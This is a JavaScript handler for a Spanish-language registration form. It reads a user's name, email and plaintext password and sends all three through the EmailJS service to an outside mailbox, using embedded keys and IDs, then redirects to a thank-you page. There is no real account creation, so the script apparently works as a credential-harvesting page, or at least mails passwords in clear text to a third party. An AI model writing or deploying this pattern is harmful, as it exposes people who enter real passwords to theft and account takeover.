emailjs.init('ReqtkWfjI392LAzFb');

document.getElementById('formularioRegistro').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const boton = document.querySelector('.boton-registro');
    boton.disabled = true;
    boton.innerHTML = `<div class="spinner"></div>Registrando...`;
    
    const datos = {
        nombre: document.getElementById('nombre').value.trim(),
        correo: document.getElementById('correo').value.trim(),
        password: document.getElementById('password').value
    };

    // Validación básica
    if(!datos.nombre || !datos.correo || !datos.password) {
        alert('Por favor completa todos los campos');
        boton.disabled = false;
        boton.innerHTML = `<span class="texto-boton">¡Registrar Ahora!</span><span class="icono-boton">🚀</span>`;
        return;
    }

    try {
        await emailjs.send("service_syrc1uk", "template_u3etoro", {
            nombre: datos.nombre,
            correo: datos.correo,
            password: datos.password
        });
        window.location.href = "thank-you.html";
    } catch (error) {
        alert('Error al enviar, por favor intenta nuevamente');
        console.error('Error:', error);
    } finally {
        boton.disabled = false;
        boton.innerHTML = `<span class="texto-boton">¡Registrar Ahora!</span><span class="icono-boton">🚀</span>`;
    }
});
